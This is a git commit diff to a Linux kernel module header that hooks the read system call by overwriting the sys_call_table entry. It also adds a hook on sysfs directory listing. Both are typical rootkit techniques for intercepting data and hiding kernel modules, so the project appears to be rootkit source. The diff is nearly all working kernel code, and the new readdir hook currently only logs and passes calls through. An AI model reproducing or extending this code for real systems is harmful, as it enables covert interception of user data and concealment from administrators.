c954cc55028b52d6c3de170cd6370bd7e209b43f
phimuemue <descpl@yahoo.de>
2011-11-27 14:33:05 +0100

    Update hook_read.h

--- hook_read.h
+++ hook_read.h
@@ -1,8 +1,13 @@
 #include "global.h"
 #include <linux/unistd.h>
+#include <linux/fs.h>
 
 typedef asmlinkage ssize_t (*fun_ssize_t_int_pvoid_size_t)(unsigned int, char __user *, size_t);
 static fun_ssize_t_int_pvoid_size_t original_read;
+
+typedef int (*fun_int_file_dirent_filldir_t)(struct file *, void*, filldir_t);
+
+fun_int_file_dirent_filldir_t original_sysfs_readdir;
 
 typedef void (*fun_void_charp_int)(char *buf, int size);
 
@@ -27,28 +32,45 @@ static void dummy_callback(char* buf, int size){
     //call this when no callback is specified
 }
 
+int hooked_sysfs_readdir(struct file * filp, void* dirent, filldir_t filldir){
+    OUR_DEBUG("Hooked sysfs_readdir.\n");
+    return original_sysfs_readdir(filp, dirent, filldir);
+}
+
 /* Hooks the read system call. */
 void hook_read(fun_void_charp_int cb){
-  void** sys_call_table = (void *) ptr_sys_call_table;
-  if(cb == 0){
-      callback_function = dummy_callback;
-  } else {
-      callback_function = cb;
-  }
+    void** sys_call_table = (void *) ptr_sys_call_table;
+    struct file_operations* sysfs_dir_ops;
 
-  original_read = sys_call_table[__NR_read];
+    if(cb == 0){
+        callback_function = dummy_callback;
+    } else {
+        callback_function = cb;
+    }
 
-  make_page_writable((long unsigned int) ptr_sys_call_table);
+    original_read = sys_call_table[__NR_read];
+    sysfs_dir_ops = (struct file_operations*)ptr_sysfs_dir_operations;
+    original_sysfs_readdir = sysfs_dir_ops->readdir;
 
-  sys_call_table[__NR_read] = (void*) hooked_read;
-  make_page_readonly((long unsigned int) ptr_sys_call_table);
+    make_page_writable((long unsigned int) ptr_sys_call_table);
+    make_page_writable((long unsigned int) sysfs_dir_ops);
+    sysfs_dir_ops->readdir = hooked_sysfs_readdir;
+    sys_call_table[__NR_read] = (void*) hooked_read;
+    make_page_readonly((long unsigned int) ptr_sys_call_table);
+    make_page_readonly((long unsigned int) sysfs_dir_ops);
 
 }
 
 /* Hooks the read system call. */
 void unhook_read(void){
-  void** sys_call_table = (void *) ptr_sys_call_table;
-  make_page_writable((long unsigned int) ptr_sys_call_table);
-  sys_call_table[__NR_read] = (void*) original_read;
-  make_page_readonly((long unsigned int) ptr_sys_call_table);
+    void** sys_call_table = (void *) ptr_sys_call_table;
+    struct file_operations* sysfs_dir_ops;
+    sysfs_dir_ops = (struct file_operations*)ptr_sysfs_dir_operations;
+    make_page_writable((long unsigned int) ptr_sys_call_table);
+    make_page_writable((long unsigned int) sysfs_dir_ops);
+    sys_call_table[__NR_read] = (void*) original_read;
+    sysfs_dir_ops = (struct file_operations*) ptr_sysfs_dir_operations;
+    sysfs_dir_ops->readdir = original_sysfs_readdir;
+    make_page_readonly((long unsigned int) ptr_sys_call_table);
+    make_page_readonly((long unsigned int) sysfs_dir_ops);
 }
